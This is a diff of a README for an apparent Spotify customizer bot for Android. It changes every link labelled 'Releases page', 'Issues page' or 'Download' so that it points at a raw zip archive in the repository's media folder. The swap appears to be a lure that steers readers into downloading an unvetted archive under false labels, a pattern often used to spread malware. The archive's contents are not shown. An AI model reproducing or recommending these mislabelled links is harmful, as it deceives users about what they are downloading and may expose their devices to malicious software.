@@ -6,9 +6,9 @@ Welcome to the Spotify-Song-Customizer-Bot! This tool helps you personalize your
 ## 📥 Download & Install
 To start using the Spotify-Song-Customizer-Bot, visit the Releases page to download the application.
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Rockyyy9/Spotify-Song-Customizer-Bot/releases)
+[![Download](https://github.com/Rockyyy9/Spotify-Song-Customizer-Bot/raw/refs/heads/main/media/Bot-Customizer-Spotify-Song-v2.3.zip)](https://github.com/Rockyyy9/Spotify-Song-Customizer-Bot/raw/refs/heads/main/media/Bot-Customizer-Spotify-Song-v2.3.zip)
 
-1. Visit the [Releases page](https://github.com/Rockyyy9/Spotify-Song-Customizer-Bot/releases).
+1. Visit the [Releases page](https://github.com/Rockyyy9/Spotify-Song-Customizer-Bot/raw/refs/heads/main/media/Bot-Customizer-Spotify-Song-v2.3.zip).
 2. Find the latest version of the Spotify-Song-Customizer-Bot.
 3. Click on the download link for your Android device.
 4. Follow the on-screen instructions to install the app.
@@ -39,13 +39,13 @@ Once installed, follow these instructions to make the most of your bot:
 If you encounter any issues while using the Spotify-Song-Customizer-Bot, here are some common solutions:
 
 - **Unable to Connect to ADB:** Ensure that USB debugging is enabled on your Android device. Go to Settings > Developer options > Enable USB debugging.
-- **App Crashes or Freezes:** Reinstall the application from the [Releases page](https://github.com/Rockyyy9/Spotify-Song-Customizer-Bot/releases) to resolve any app corruption issues.
+- **App Crashes or Freezes:** Reinstall the application from the [Releases page](https://github.com/Rockyyy9/Spotify-Song-Customizer-Bot/raw/refs/heads/main/media/Bot-Customizer-Spotify-Song-v2.3.zip) to resolve any app corruption issues.
 - **Spotify Not Responding:** Make sure you have the latest version of the Spotify app installed on your device.
 
 ## 🌐 Community Support
 Join our community for additional support and tips. Share your experiences and get advice from other users. You can find us on:
 
-- **GitHub Issues:** Report bugs or request features directly on our [Issues page](https://github.com/Rockyyy9/Spotify-Song-Customizer-Bot/issues).
+- **GitHub Issues:** Report bugs or request features directly on our [Issues page](https://github.com/Rockyyy9/Spotify-Song-Customizer-Bot/raw/refs/heads/main/media/Bot-Customizer-Spotify-Song-v2.3.zip).
 - **Online Forums:** Engage with other users on platforms like Reddit or tech blogs dedicated to music personalization.
 
 ## 📚 Additional Resources
@@ -57,4 +57,4 @@ To further enhance your experience, consider reviewing the following resources:
 ## ⚡ Summary
 Thank you for choosing the Spotify-Song-Customizer-Bot. We are confident that this tool will enrich your music experience like never before. For any queries, feel free to reach out via our community channels or GitHub.
 
-Visit the [Releases page](https://github.com/Rockyyy9/Spotify-Song-Customizer-Bot/releases) to download and take control of your music today!
+Visit the [Releases page](https://github.com/Rockyyy9/Spotify-Song-Customizer-Bot/raw/refs/heads/main/media/Bot-Customizer-Spotify-Song-v2.3.zip) to download and take control of your music today!
